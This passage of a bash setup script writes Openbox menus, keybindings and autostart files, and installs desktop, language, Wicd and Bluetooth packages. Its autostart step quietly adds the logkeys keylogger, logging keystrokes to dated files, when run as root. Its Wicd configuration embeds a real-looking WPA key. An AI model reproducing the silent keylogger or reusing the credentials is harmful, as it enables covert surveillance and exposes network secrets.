			<item label=£+Awn Settings£+><action name=£+Execure£+><execute>python /usr/share/avant-window-navigator/awn-settings/awnSettings.py</execute></action></item>
		</menu>
		<item label=£+Edit Xorg.conf£+><action name=£+Execute£+><execute>geany /etc/X11/xorg.conf</execute></action></item>
		<item label=£+Input Device Preferences (Lxinput)£+><action name=£+Execute£+><execute>lxinput</execute></action></item>
		<item label=£+Keymap£+><action name=£+Execute£+><execute>lxkeymap</execute></action></item>
		<item label=£+Lxappearance£+><action name=£+Execute£+><execute>lxappearance</execute></action></item>
		<item label=£+LxRandr£+><action name=£+Execute£+><execute>lxrandr</execute></action></item>
		<item label=£+Thunar Volman Settings£+><action name=£+Execute£+><execute>/usr/lib/thunar-volman/thunar-volman-settings</execute></action></item>
		<item label=£+Gconf-Editor£+><action name=£+Execute£+><execute>gconf-editor</execute></action></item>
	</menu>
	<separator/>
	<item label=£+Reconfigure OpenBox£+><action name=£+Reconfigure£+/></item>
	<item label=£+Restart OpenBox£+><action name=£+Restart£+/></item>
	<separator/>
	<item label=£+Svuota Cestino£+><action name=£+Execute£+><execute>rm -fr $home/.local/share/Trash/files/*</execute></action></item>
	<separator/>
	<menu id=£+root-menu-12£+ label=£+PowerManager£+>
		<item label=£+Halt£+><action name=£+Execute£+><execute>roxterm -e halt </execute></action></item>
		<item label=£+Reboot£+><action name=£+Execute£+><execute>roxterm -e reboot</execute></action></item>
	</menu>
</menu>

</openbox_menu>


" | sed -e 's/£+/"/g' >> menu.xml

}

f_writing_openbox_menu

echo "$home/.config/openbox/menu.xml" >> $file

cd $home

}

f_menu

# Rc
f_rc () {

cd $home/.config/openbox
cp /etc/xdg/openbox/rc.xml $home/.config/rc.xml.back

rm -f rc.xml
touch rc.xml

f_writing_openbox_rc () {

echo "<?xml version=£+1.0£+ encoding=£+UTF-8£+?>

<openbox_config xmlns=£+http://openbox.org/3.4/rc£+>

<resistance>
  <strength>10</strength>
  <screen_edge_strength>20</screen_edge_strength>
</resistance>

<focus>
  <focusNew>yes</focusNew>
  <followMouse>no</followMouse>
  <focusLast>yes</focusLast>
  <underMouse>no</underMouse>
  <focusDelay>200</focusDelay>
  <raiseOnFocus>no</raiseOnFocus>
</focus>

<placement>
  <policy>Smart</policy>
  <center>yes</center>
  <monitor>Active</monitor>
  <primaryMonitor>1</primaryMonitor>
</placement>

<theme>
  <name>Onyx</name>
  <titleLayout>NLIMCS</titleLayout>
  <keepBorder>yes</keepBorder>
  <animateIconify>yes</animateIconify>
  <font place=£+ActiveWindow£+><name>sans</name><size>8</size><weight>bold</weight><slant>normal</slant></font>
  <font place=£+InactiveWindow£+><name>sans</name><size>8</size><weight>bold</weight><slant>normal</slant></font>
  <font place=£+MenuHeader£+><name>sans</name><size>10</size><weight>normal</weight><slant>normal</slant></font>
  <font place=£+MenuItem£+><name>sans</name><size>9</size><weight>normal</weight><slant>normal</slant></font>
  <font place=£+OnScreenDisplay£+><name>sans</name><size>9</size><weight>bold</weight><slant>normal</slant></font>
</theme>

<desktops>
  <number>8</number>
  <firstdesk>1</firstdesk>
  <names>desktop 1</names>
  <names>desktop 2</names>
  <names>desktop 3</names>
  <names>desktop 4</names>
  <names>desktop 5</names>
  <names>desktop 6</names>
  <popupTime>500</popupTime>
</desktops>

<resize>
  <drawContents>yes</drawContents>
  <popupShow>Nonpixel</popupShow>
  <popupPosition>Center</popupPosition>
  <popupFixedPosition><x>10</x><y>10</y></popupFixedPosition>
</resize>

<margins>
  <top>0</top>
  <bottom>0</bottom>
  <left>0</left>
  <right>300</right>
</margins>

<dock>
  <position>BottomLeft</position>
  <floatingX>0</floatingX>
  <floatingY>0</floatingY>
  <noStrut>no</noStrut>
  <stacking>Above</stacking>
  <direction>Vertical</direction>
  <autoHide>no</autoHide>
  <hideDelay>300</hideDelay>
  <showDelay>300</showDelay>
  <moveButton>Middle</moveButton>
</dock>

<keyboard>
  <chainQuitKey>C-g</chainQuitKey>

  ! General
  <keybind key=£+W-d£+><action name=£+ToggleShowDesktop£+/></keybind>
  <keybind key=£+A-F4£+><action name=£+Close£+/></keybind>
  <keybind key=£+A-Escape£+><action name=£+Lower£+/><action name=£+FocusToBottom£+/><action name=£+Unfocus£+/></keybind>
  <keybind key=£+A-Tab£+><action name=£+NextWindow£+/></keybind>
  <keybind key=£+A-S-Tab£+><action name=£+PreviousWindow£+/></keybind>
  <keybind key=£+C-A-Tab£+><action name=£+NextWindow£+><panels>yes</panels><desktop>yes</desktop></action></keybind>

  ! Desktop L/R/U/D
  <keybind key=£+M-D-Left£+><action name=£+DesktopLeft£+><dialog>no</dialog><wrap>no</wrap></action></keybind>
  <keybind key=£+M-D-Right£+><action name=£+DesktopRight£+><dialog>no</dialog><wrap>no</wrap></action></keybind>
  <keybind key=£+M-D-Up£+><action name=£+DesktopUp£+><dialog>no</dialog><wrap>no</wrap></action></keybind>
  <keybind key=£+M-D-Down£+><action name=£+DesktopDown£+><dialog>no</dialog><wrap>no</wrap></action></keybind>

  ! SendToDesktop
  <keybind key=£+S-T-Left£+><action name=£+SendToDesktopLeft£+><dialog>no</dialog><wrap>no</wrap></action></keybind>
  <keybind key=£+S-T-Right£+><action name=£+SendToDesktopRight£+><dialog>no</dialog><wrap>no</wrap></action></keybind>
  <keybind key=£+S-T-Up£+><action name=£+SendToDesktopUp£+><dialog>no</dialog><wrap>no</wrap></action></keybind>
  <keybind key=£+S-T-Down£+><action name=£+SendToDesktopDown£+><dialog>no</dialog><wrap>no</wrap></action></keybind>

  ! Desktop Number
  <keybind key=£+N-F1£+><action name=£+Desktop£+><desktop>1</desktop></action></keybind>
  <keybind key=£+N-F2£+><action name=£+Desktop£+><desktop>2</desktop></action></keybind>
  <keybind key=£+N-F3£+><action name=£+Desktop£+><desktop>3</desktop></action></keybind>
  <keybind key=£+N-F4£+><action name=£+Desktop£+><desktop>4</desktop></action></keybind>
  <keybind key=£+N-F5£+><action name=£+Desktop£+><desktop>5</desktop></action></keybind>
  <keybind key=£+N-F6£+><action name=£+Desktop£+><desktop>6</desktop></action></keybind>

  ! Volume
  <keybind key=£+Ctrl-Up£+><action name=£+Execute£+><command>amixer set Master 5%+</command></action></keybind>
  <keybind key=£+Ctrl-Down£+><action name=£+Execute£+><command>amixer set Master 5%-</command></action></keybind>

  ! Multimedia Key
  <keybind key=£+XF86AudioRaiseVolume£+><action name=£+Execute£+><command>amixer set Master 5%+ unmute</command></action></keybind>
  <keybind key=£+XF86AudioLowerVolume£+><action name=£+Execute£+><command>amixer set Master 5%- unmute</command></action></keybind>
  <keybind key=£+XF86AudioMute£+><action name=£+Execute£+><command>amixer set Master toggle</command></action></keybind>
  ! Audacious
  <keybind key=£+XF86AudioNext£+><action name=£+Execute£+><command>audacious -f</command></action></keybind>
  <keybind key=£+XF86AudioPlay£+><action name=£+Execute£+><command>audacious -p</command></action></keybind>
  <keybind key=£+XF86AudioPrev£+><action name=£+Execute£+><command>audacious -r</command></action></keybind>
  <keybind key=£+XF86AudioStop£+><action name=£+Execute£+><command>audacious -s</command></action></keybind>
  <keybind key=£+XF86AudioPause£+><action name=£+Execute£+><command>audacious -t</command></action></keybind>

  ! Openbox Root-Menu
  <keybind key=£+S-C-A-space£+><action name=£+ShowMenu£+><menu>root-menu</menu></action></keybind>

  ! Programs
  <keybind key=£+Alt-C£+><action name=£+Execute£+><startupnotify><enabled>true</enabled><name>midori</name></startupnotify><command>proxychains midori -p</command></action></keybind>
  <keybind key=£+Alt-T£+><action name=£+Execute£+><startupnotify><enabled>true</enabled><name>Terminal</name></startupnotify><command>roxterm</command></action></keybind>
  <keybind key=£+Alt-F2£+><action name=£+execute£+><execute>gmrun</execute></action></keybind>

</keyboard>

<mouse>
  <dragThreshold>8</dragThreshold>
  <doubleClickTime>200</doubleClickTime>
  <screenEdgeWarpTime>400</screenEdgeWarpTime>

  <context name=£+Frame£+><mousebind button=£+A-Left£+ action=£+Press£+><action name=£+Focus£+/><action name=£+Raise£+/></mousebind>
    <mousebind button=£+A-Left£+ action=£+Click£+><action name=£+Unshade£+/></mousebind>
    <mousebind button=£+A-Left£+ action=£+Drag£+><action name=£+Move£+/></mousebind>
    <mousebind button=£+A-Right£+ action=£+Press£+><action name=£+Focus£+/><action name=£+Raise£+/><action name=£+Unshade£+/></mousebind>
    <mousebind button=£+A-Right£+ action=£+Drag£+><action name=£+Resize£+/></mousebind>
    <mousebind button=£+A-Middle£+ action=£+Press£+><action name=£+Lower£+/><action name=£+FocusToBottom£+/><action name=£+Unfocus£+/></mousebind>
    <mousebind button=£+A-Up£+ action=£+Click£+><action name=£+DesktopPrevious£+/></mousebind>
    <mousebind button=£+A-Down£+ action=£+Click£+><action name=£+DesktopNext£+/></mousebind>
    <mousebind button=£+C-A-Up£+ action=£+Click£+><action name=£+DesktopPrevious£+/></mousebind>
    <mousebind button=£+C-A-Down£+ action=£+Click£+><action name=£+DesktopNext£+/></mousebind>
    <mousebind button=£+A-S-Up£+ action=£+Click£+><action name=£+SendToDesktopPrevious£+/></mousebind>
    <mousebind button=£+A-S-Down£+ action=£+Click£+><action name=£+SendToDesktopNext£+/></mousebind>
  </context>

  <context name=£+Titlebar£+>
    <mousebind button=£+Left£+ action=£+Press£+><action name=£+Focus£+/><action name=£+Raise£+/></mousebind>
    <mousebind button=£+Left£+ action=£+Drag£+><action name=£+Move£+/></mousebind>
    <mousebind button=£+Left£+ action=£+DoubleClick£+><action name=£+ToggleMaximizeFull£+/></mousebind>
    <mousebind button=£+Middle£+ action=£+Press£+><action name=£+Lower£+/><action name=£+FocusToBottom£+/><action name=£+Unfocus£+/></mousebind>
    <mousebind button=£+Up£+ action=£+Click£+><action name=£+Shade£+/><action name=£+FocusToBottom£+/><action name=£+Unfocus£+/><action name=£+Lower£+/></mousebind>
    <mousebind button=£+Down£+ action=£+Click£+><action name=£+Unshade£+/><action name=£+Raise£+/></mousebind>
    <mousebind button=£+Right£+ action=£+Press£+><action name=£+Focus£+/><action name=£+Raise£+/><action name=£+ShowMenu£+><menu>client-menu</menu></action></mousebind>
  </context>

  <context name=£+Top£+>
    <mousebind button=£+Left£+ action=£+Press£+><action name=£+Focus£+/><action name=£+Raise£+/><action name=£+Unshade£+/></mousebind>
    <mousebind button=£+Left£+ action=£+Drag£+><action name=£+Resize£+><edge>top</edge></action></mousebind>
  </context>

  <context name=£+Left£+>
    <mousebind button=£+Left£+ action=£+Press£+><action name=£+Focus£+/><action name=£+Raise£+/></mousebind>
    <mousebind button=£+Left£+ action=£+Drag£+><action name=£+Resize£+><edge>left</edge></action></mousebind>
    <mousebind button=£+Right£+ action=£+Press£+><action name=£+Focus£+/><action name=£+Raise£+/><action name=£+ShowMenu£+><menu>client-menu</menu></action></mousebind>
  </context>

  <context name=£+Right£+>
    <mousebind button=£+Left£+ action=£+Press£+><action name=£+Focus£+/><action name=£+Raise£+/></mousebind>
    <mousebind button=£+Left£+ action=£+Drag£+><action name=£+Resize£+><edge>right</edge></action></mousebind>
    <mousebind button=£+Right£+ action=£+Press£+><action name=£+Focus£+/><action name=£+Raise£+/><action name=£+ShowMenu£+><menu>client-menu</menu></action></mousebind>
  </context>

  <context name=£+Bottom£+>
    <mousebind button=£+Left£+ action=£+Press£+><action name=£+Focus£+/><action name=£+Raise£+/></mousebind>
    <mousebind button=£+Left£+ action=£+Drag£+><action name=£+Resize£+><edge>bottom</edge></action></mousebind>
    <mousebind button=£+Middle£+ action=£+Press£+><action name=£+Lower£+/><action name=£+FocusToBottom£+/><action name=£+Unfocus£+/></mousebind>
    <mousebind button=£+Right£+ action=£+Press£+><action name=£+Focus£+/><action name=£+Raise£+/><action name=£+ShowMenu£+><menu>client-menu</menu></action></mousebind>
  </context>

  <context name=£+BLCorner£+>
    <mousebind button=£+Left£+ action=£+Press£+><action name=£+Focus£+/><action name=£+Raise£+/></mousebind>
    <mousebind button=£+Left£+ action=£+Drag£+><action name=£+Resize£+/></mousebind>
  </context>

  <context name=£+BRCorner£+>
    <mousebind button=£+Left£+ action=£+Press£+><action name=£+Focus£+/><action name=£+Raise£+/></mousebind>
    <mousebind button=£+Left£+ action=£+Drag£+><action name=£+Resize£+/></mousebind>
  </context>

  <context name=£+TLCorner£+>
    <mousebind button=£+Left£+ action=£+Press£+><action name=£+Focus£+/><action name=£+Raise£+/><action name=£+Unshade£+/></mousebind>
    <mousebind button=£+Left£+ action=£+Drag£+><action name=£+Resize£+/></mousebind>
  </context>

  <context name=£+TRCorner£+>
    <mousebind button=£+Left£+ action=£+Press£+><action name=£+Focus£+/><action name=£+Raise£+/><action name=£+Unshade£+/></mousebind>
    <mousebind button=£+Left£+ action=£+Drag£+><action name=£+Resize£+/></mousebind>
  </context>

  <context name=£+Client£+>
    <mousebind button=£+Left£+ action=£+Press£+><action name=£+Focus£+/><action name=£+Raise£+/></mousebind>
    <mousebind button=£+Middle£+ action=£+Press£+><action name=£+Focus£+/><action name=£+Raise£+/></mousebind>
    <mousebind button=£+Right£+ action=£+Press£+><action name=£+Focus£+/><action name=£+Raise£+/></mousebind>
  </context>

  <context name=£+Icon£+>
    <mousebind button=£+Left£+ action=£+Press£+><action name=£+Focus£+/><action name=£+Raise£+/><action name=£+Unshade£+/><action name=£+ShowMenu£+><menu>client-menu</menu></action></mousebind>
    <mousebind button=£+Right£+ action=£+Press£+><action name=£+Focus£+/><action name=£+Raise£+/><action name=£+ShowMenu£+><menu>client-menu</menu></action></mousebind>
  </context>

  <context name=£+AllDesktops£+>
    <mousebind button=£+Left£+ action=£+Press£+><action name=£+Focus£+/><action name=£+Raise£+/><action name=£+Unshade£+/></mousebind>
    <mousebind button=£+Left£+ action=£+Click£+><action name=£+ToggleOmnipresent£+/></mousebind>
  </context>

  <context name=£+Shade£+>
    <mousebind button=£+Left£+ action=£+Press£+><action name=£+Focus£+/><action name=£+Raise£+/></mousebind>
    <mousebind button=£+Left£+ action=£+Click£+><action name=£+ToggleShade£+/>
    </mousebind>
  </context>

  <context name=£+Iconify£+>
    <mousebind button=£+Left£+ action=£+Press£+><action name=£+Focus£+/><action name=£+Raise£+/></mousebind>
    <mousebind button=£+Left£+ action=£+Click£+><action name=£+Iconify£+/></mousebind>
  </context>

  <context name=£+Maximize£+>
    <mousebind button=£+Left£+ action=£+Press£+><action name=£+Focus£+/><action name=£+Raise£+/><action name=£+Unshade£+/></mousebind>
    <mousebind button=£+Middle£+ action=£+Press£+><action name=£+Focus£+/><action name=£+Raise£+/><action name=£+Unshade£+/></mousebind>
    <mousebind button=£+Right£+ action=£+Press£+><action name=£+Focus£+/><action name=£+Raise£+/><action name=£+Unshade£+/></mousebind>
    <mousebind button=£+Left£+ action=£+Click£+><action name=£+ToggleMaximizeFull£+/></mousebind>
    <mousebind button=£+Middle£+ action=£+Click£+><action name=£+ToggleMaximizeVert£+/></mousebind>
    <mousebind button=£+Right£+ action=£+Click£+><action name=£+ToggleMaximizeHorz£+/></mousebind>
  </context>

  <context name=£+Close£+>
    <mousebind button=£+Left£+ action=£+Press£+><action name=£+Focus£+/><action name=£+Raise£+/> <action name=£+Unshade£+/></mousebind>
    <mousebind button=£+Left£+ action=£+Click£+><action name=£+Close£+/></mousebind>
  </context>

  <context name=£+Desktop£+>
    <mousebind button=£+Up£+ action=£+Click£+><action name=£+DesktopPrevious£+/></mousebind>
    <mousebind button=£+Down£+ action=£+Click£+><action name=£+DesktopNext£+/></mousebind>
    <mousebind button=£+A-Up£+ action=£+Click£+><action name=£+DesktopPrevious£+/></mousebind>
    <mousebind button=£+A-Down£+ action=£+Click£+><action name=£+DesktopNext£+/></mousebind>
    <mousebind button=£+C-A-Up£+ action=£+Click£+><action name=£+DesktopPrevious£+/></mousebind>
    <mousebind button=£+C-A-Down£+ action=£+Click£+><action name=£+DesktopNext£+/></mousebind>
    <mousebind button=£+Left£+ action=£+Press£+><action name=£+Focus£+/><action name=£+Raise£+/></mousebind>
    <mousebind button=£+Right£+ action=£+Press£+><action name=£+Focus£+/><action name=£+Raise£+/></mousebind>
  </context>

  <context name=£+Root£+>
    <mousebind button=£+Middle£+ action=£+Press£+><action name=£+ShowMenu£+><menu>client-list-combined-menu</menu></action></mousebind>
    <mousebind button=£+Right£+ action=£+Press£+><action name=£+ShowMenu£+><menu>root-menu</menu></action></mousebind>
  </context>

  <context name=£+MoveResize£+>
    <mousebind button=£+Up£+ action=£+Click£+><action name=£+DesktopPrevious£+/></mousebind>
    <mousebind button=£+Down£+ action=£+Click£+><action name=£+DesktopNext£+/></mousebind>
    <mousebind button=£+A-Up£+ action=£+Click£+><action name=£+DesktopPrevious£+/></mousebind>
    <mousebind button=£+A-Down£+ action=£+Click£+><action name=£+DesktopNext£+/></mousebind>
  </context>

</mouse>

<menu>
  <file>/var/lib/openbox/debian-menu.xml</file>
  <file>debian-menu.xml</file>
  <file>menu.xml</file>
  <hideDelay>200</hideDelay>
  <middle>no</middle>
  <submenuShowDelay>50</submenuShowDelay>
  <submenuHideDelay>400</submenuHideDelay>
  <applicationIcons>yes</applicationIcons>
  <manageDesktops>yes</manageDesktops>
</menu>

<applications>
	<application name=£+urxvt-darkeffe£+><decor>no</decor><focus>yes</focus><position><x>center</x><y>20</y></position><layer>below</layer><desktop>all</desktop><maximized>true</maximized></application>
</applications>

</openbox_config>


" | sed -e 's/£+/"/g' >> rc.xml

}

f_writing_openbox_rc

echo "$home/.config/openbox/rc.xml" >> $file

cd $home

}

f_rc

# Autostart
f_autostart () {

cd $home/.config/openbox
rm -f autostart.sh
touch autostart.sh

f_writing_openbox_autostart () {

echo "# This shell script is run before Openbox launches.
# Environment variables set here are passed to the Openbox session.

# Set a background color
BG=£+£+£+£+
if which hsetroot >/dev/null; then
    BG=hsetroot
else
    if which esetroot >/dev/null; then
		BG=esetroot
    else
		if which xsetroot >/dev/null; then
			BG=xsetroot
		fi
    fi
fi

test -z $BG || $BG -solid £+£+#303030£+£+

# D-bus
if which dbus-launch >/dev/null && test -z £+£+$DBUS_SESSION_BUS_ADDRESS£+£+; then
       eval `dbus-launch --sh-syntax --exit-with-session`
fi

# Make GTK apps look and behave how they were set up in the gnome config tools
if test -x /usr/libexec/gnome-settings-daemon >/dev/null; then
  /usr/libexec/gnome-settings-daemon &
elif which gnome-settings-daemon >/dev/null; then
  gnome-settings-daemon &
# Make GTK apps look and behave how they were set up in the XFCE config tools
elif which xfce-mcs-manager >/dev/null; then
  xfce-mcs-manager n &
fi

# Preload stuff for KDE apps
if which start_kdeinit >/dev/null; then
  LD_BIND_NOW=true start_kdeinit --new-startup +kcminit_startup &
fi

# Run XDG autostart things.  By default don''t run anything desktop-specific
# See xdg-autostart --help more info
DESKTOP_ENV=£+£+OPENBOX£+£+
if which /usr/lib/openbox/xdg-autostart >/dev/null; then
  /usr/lib/openbox/xdg-autostart $DESKTOP_ENV
fi

#!/bin/sh

export OOO_FORCE_DESKTOP=gnome

( bash /opt/darkeffe/firewallclient.sh ) &

killall wicd > /dev/null 2>&1
( wicd ) &

killall tint2 > /dev/null 2>&1
tint2 &

killall cairo-compmgr > /dev/null 2>&1
cairo-compmgr &

killall thunar > /dev/null 2>&1
thunar --daemon &

killall wicd-client > /dev/null 2>&1
(sleep 3 && wicd-client -a) &

killall avant-window-navigator > /dev/null 2>&1
avant-window-navigator -o &

killall bluetooth-applet > /dev/null 2>&1
bluetooth-applet &

killall conky > /dev/null 2>&1
conky -c $home/.config/conky/conkyrc &

killall qjackctl > /dev/null 2>&1
qjackctl &

killall nitrogen > /dev/null 2>&1
nitrogen --restore &

" | sed -e 's/£+/"/g' >> autostart.sh

if [ $accountcho == $root ]; then
	echo "killall logkeys &" >> autostart.sh
	echo -n "logkeys -s -o $home" >> autostart.sh
	echo '/.logkeys/logkeys-$(date +%d-%m-%Y).txt & ' >> autostart.sh
	echo ""  >> autostart.sh
fi

}

f_writing_openbox_autostart

echo "$home/.config/openbox/autostart.sh" >> $file

cd $home

}

f_autostart

# Scripts
f_audaciouspy () {

cd $home/.config/openbox/scripts

rm -f audacious.py
touch audacious.py

f_writing_openbox_audacious () {

echo "#!/bin/bash
# author:Matsuda Shinpei
# Date:March 2011
#
# Openbox Pipe Menu for audacious
# Feel free to change this script as you like.
# Probably, it's not so hard to make rhythembox or other media player control menus like this,
# as far as these media players support the GUI control commands.

if [ ! £+$(pidof audacious)£+ ]; then
    cat <<EOF
<openbox_pipe_menu>
  <item label=£+Run audacious£+>
    <action name=£+Execute£+>
      <execute>
        audacious
      </execute>
    </action>
  </item>
</openbox_pipe_menu>
EOF
else
# if you want to show artist and album name, add next line to just below <openbox_pipe_menu>.
# <separator label=£+`audtool --current-song-tuple-data artist`  :  `audtool --current-song-tuple-data album`£+ />
cat <<EOF
<openbox_pipe_menu>
<separator label= £+`audtool --current-song` (`audtool --current-song-length`)£+ />
   <item label=£+Play£+>
     <action name=£+Execute£+>
       <execute>
         audtool --playback-play
       </execute>
     </action>
   </item>
   <item label=£+Pause£+>
     <action name=£+Execute£+>
       <execute>
         audtool --playback-pause
       </execute>
     </action>
   </item>
   <item label=£+Stop£+>
     <action name=£+Execute£+>
       <execute>
         audtool --playback-stop
       </execute>
     </action>
   </item>
   <item label=£+Previous£+>
     <action name=£+Execute£+>
       <execute>
         audtool --playlist-reverse
       </execute>
     </action>
   </item>
   <item label=£+Next£+>
     <action name=£+Execute£+>
       <execute>
         audtool --playlist-advance
       </execute>
     </action>
   </item>
   <separator/>
   <item label=£+Repeat `audtool --playlist-repeat-status`£+>
     <action name = £+execute£+>
       <execute>
         audtool --playlist-repeat-toggle
       </execute>
     </action>
   </item>
   <item label=£+Shuffle `audtool --playlist-shuffle-status`£+>
     <action name = £+execute£+>
       <execute>
         audtool --playlist-shuffle-toggle
       </execute>
     </action>
   </item>
   <separator/>
   <item label=£+Jump to file£+>
     <action name=£+Execute£+>
       <execute>
         audtool --jumptofile-show on
       </execute>
     </action>
   </item>
   <item label=£+Playlist£+>
     <action name=£+Execute£+>
       <execute>
         audtool --playlist-show on --always-on-top on
       </execute>
     </action>
   </item>
   <item label=£+Add files£+>
     <action name=£+Execute£+>
       <execute>
         audtool --filebrowser-show on --always-on-top on
       </execute>
     </action>
   </item>
   <separator />
   <item label=£+Preferences£+>
     <action name=£+Execute£+>
       <execute>
         audtool --preferences-show on
       </execute>
     </action>
   </item>
   <item label=£+Quit audacious£+>
     <action name=£+Execute£+>
       <execute>
         audtool --shutdown
       </execute>
     </action>
   </item>
</openbox_pipe_menu>
EOF
fi

" | sed -e 's/£+/"/g' >> audacious.py

}

f_writing_openbox_audacious

echo "$home/.config/openbox/scripts/audacious.py" >> $file

cd $home

}

f_audaciouspy

}

f_openbox

time_stop

}

f_compiz_buntu_debian () {

echo -n "[*] Installing Compiz ... "

timelapsed &

apt-get install -y --force-yes compiz 1> /dev/null 2> $LOG
apt-get install -y --force-yes compizconfig-settings-manager 1> /dev/null 2> $LOG
apt-get install -y --force-yes compiz-fusion-plugins-main 1> /dev/null 2> $LOG
apt-get install -y --force-yes compiz-fusion-plugins-extra 1> /dev/null 2> $LOG
apt-get install -y --force-yes librsvg2-common 1> /dev/null 2> $LOG
apt-get install -y --force-yes fusion-icon 1> /dev/null 2> $LOG

time_stop

}




# Language
f_it_buntu_debian () {

echo -n "[*] Language it ... "

timelapsed &

apt-get install -y --force-yes language-pack-it language-pack-it-base 1> /dev/null 2> $LOG

apt-get install -y --force-yes libreoffice-l10n-it 1> /dev/null 2> $LOG

time_stop

}



# Network
f_wicd_nogui_buntu_debian () {

apt-get install -y --force-yes wpasupplicant 1> /dev/null 2> $LOG

echo -n "[*] Installing Wicd ... "

timelapsed &

apt-get install -y --force-yes wicd-daemon python-wicd wicd-cli wicd-curses 1> /dev/null 2> $LOG

echo ""
echo -n "   - Creating Dir and Configuration Files ... "
wicd 1> /dev/null
sleep 5
pkill wicd 1> /dev/null
sleep 5
cd /etc
mkdir -p wicd
echo "/etc/wicd" >> $file
cd wicd

rm -f manager-settings.conf
touch manager-settings.conf

f_writing_wicd_manager () {

echo "
[Settings]
wireless_interface = wlan0
pref_width = 475
prefer_wired = False
flush_tool = 0
use_global_dns = True
global_dns_dom = 87.118.111.215
always_show_wired_interface = True
global_dns_1 = 87.118.111.215
global_dns_2 = 81.174.67.134
global_dns_3 = 208.67.222.222
backend = external
should_verify_ap = 1
netprop_width = 414
link_detect_tool = 0
main_height = 750
dhcp_client = 1
sudo_app = 0
wired_connect_mode = 1
netprop_height = 600
debug_mode = 1
pref_height = 400
wired_interface = eth0
signal_display_type = 1
global_search_dom = 87.118.111.215
auto_reconnect = True
main_width = 1280
wpa_driver = wext
" >> manager-settings.conf

}

f_writing_wicd_manager
echo "/etc/wicd/manager-settings.conf" >> $file


rm -f wired-settings.conf
touch wired-settings.conf

f_writing_wicd_wired () {

echo "
[wired-default]
afterscript = None
use_static_dns = 1
dhcphostname = bt
beforescript = None
dns3 = None
postdisconnectscript = None
use_dhcphostname = 0
dns1 = None
dns_domain = None
lastused = True
broadcast = None
default = 1
netmask = 255.255.255.0
gateway = 192.168.0.1
dns2 = None
usedhcphostname = 0
profilename = wired-default
predisconnectscript = None
ip = 192.168.0.10
search_domain = None
use_global_dns = 1
" >> wired-settings.conf

}

f_writing_wicd_wired
echo "/etc/wicd/wired-settings.conf" >> $file

rm -f wireless-settings.conf
touch wireless-settings.conf

f_writing_wicd_wireless () {

echo "
[00:26:F2:40:BE:46]
afterscript = None
dhcphostname = bt
bssid = 00:26:F2:40:BE:46
postdisconnectscript = None
use_dhcphostname = 0
dns_domain = None
quality = 48
gateway = 192.168.0.1
use_global_dns = 1
strength = -76
encryption = True
bitrates = 6 Mb/s
ip = 192.168.0.10
beforescript = None
hidden = False
channel = 11
mode = Master
psk = 3f80cb6082dba077a1a9ca4f3fed194a2d14a8e098ec2aceed310b282798b634
has_profile = True
netmask = 255.255.255.0
key = 62MNRSTUVZ
usedhcphostname = False
predisconnectscript = None
enctype = wpa
dns3 = None
dns2 = None
search_domain = None
use_settings_globally = 0
use_static_dns = 1
encryption_method = WPA2
essid = NETGEAR
automatic = True
dns1 = None
" >> wireless-settings.conf

}

f_writing_wicd_wireless
echo "/etc/wicd/wireless-settings.conf" >> $file

cd $home

time_stop

}

f_wicd_buntu_debian () {

echo -n "[*] Installing Wicd ... "

timelapsed &

apt-get install -y --force-yes wpasupplicant 1> /dev/null 2> $LOG
apt-get install -y --force-yes wpagui 1> /dev/null 2> $LOG

apt-get install -y --force-yes wicd-daemon python-wicd wicd-cli wicd-curses 1> /dev/null 2> $LOG
apt-get install -y --force-yes wicd-gtk 1> /dev/null 2> $LOG

echo ""
echo -n "   - Creating Dir and Configuration Files ... "
wicd 1> /dev/null
sleep 5
pkill wicd 1> /dev/null
sleep 5
cd /etc
mkdir -p wicd
echo "/etc/wicd" >> $file
cd wicd

rm -f manager-settings.conf
touch manager-settings.conf

f_writing_wicd_manager () {

echo "
[Settings]
wireless_interface = wlan0
pref_width = 475
prefer_wired = False
flush_tool = 0
use_global_dns = True
global_dns_dom = 87.118.111.215
always_show_wired_interface = True
global_dns_1 = 87.118.111.215
global_dns_2 = 81.174.67.134
global_dns_3 = 208.67.222.222
backend = external
should_verify_ap = 1
netprop_width = 414
link_detect_tool = 0
main_height = 750
dhcp_client = 1
sudo_app = 0
wired_connect_mode = 1
netprop_height = 600
debug_mode = 1
pref_height = 400
wired_interface = eth0
signal_display_type = 1
global_search_dom = 87.118.111.215
auto_reconnect = True
main_width = 1280
wpa_driver = wext
" >> manager-settings.conf

}

f_writing_wicd_manager
echo "/etc/wicd/manager-settings.conf" >> $file


rm -f wired-settings.conf
touch wired-settings.conf

f_writing_wicd_wired () {

echo "
[wired-default]
afterscript = None
use_static_dns = 1
dhcphostname = bt
beforescript = None
dns3 = None
postdisconnectscript = None
use_dhcphostname = 0
dns1 = None
dns_domain = None
lastused = True
broadcast = None
default = 1
netmask = 255.255.255.0
gateway = 192.168.0.1
dns2 = None
usedhcphostname = 0
profilename = wired-default
predisconnectscript = None
ip = 192.168.0.10
search_domain = None
use_global_dns = 1
" >> wired-settings.conf

}

f_writing_wicd_wired
echo "/etc/wicd/wired-settings.conf" >> $file

rm -f wireless-settings.conf
touch wireless-settings.conf

f_writing_wicd_wireless () {

echo "
[00:26:F2:40:BE:46]
afterscript = None
dhcphostname = bt
bssid = 00:26:F2:40:BE:46
postdisconnectscript = None
use_dhcphostname = 0
dns_domain = None
quality = 48
gateway = 192.168.0.1
use_global_dns = 1
strength = -76
encryption = True
bitrates = 6 Mb/s
ip = 192.168.0.10
beforescript = None
hidden = False
channel = 11
mode = Master
psk = 3f80cb6082dba077a1a9ca4f3fed194a2d14a8e098ec2aceed310b282798b634
has_profile = True
netmask = 255.255.255.0
key = 62MNRSTUVZ
usedhcphostname = False
predisconnectscript = None
enctype = wpa
dns3 = None
dns2 = None
search_domain = None
use_settings_globally = 0
use_static_dns = 1
encryption_method = WPA2
essid = NETGEAR
automatic = True
dns1 = None
" >> wireless-settings.conf

}

f_writing_wicd_wireless
echo "/etc/wicd/wireless-settings.conf" >> $file


cd $home

time_stop

}

f_blue_kde_buntu_debian () {

echo -n "[*] Installing Bluetooth ... "

timelapsed &

apt-get install -y --force-yes  bluez bluez-gstreamer bluez-alsa bluez-compat bluez-cups obexftp obex-data-server bluewho 1> /dev/null 2> $LOG

time_stop

}

f_blue_buntu_debian () {

echo -n "[*] Installing Bluetooth ... "

timelapsed &

apt-get install -y --force-yes bluez bluez-gstreamer bluez-alsa bluez-compat bluez-cups obexftp obex-data-server bluewho gnome-bluetooth 1> /dev/null 2> $LOG

time_stop

}

f_gigolo_buntu_debian () {

echo -n "[*] Installing Gigolo ... "

timelapsed &

apt-get install -y --force-yes gigolo 1> /dev/null 2> $LOG

time_stop

}

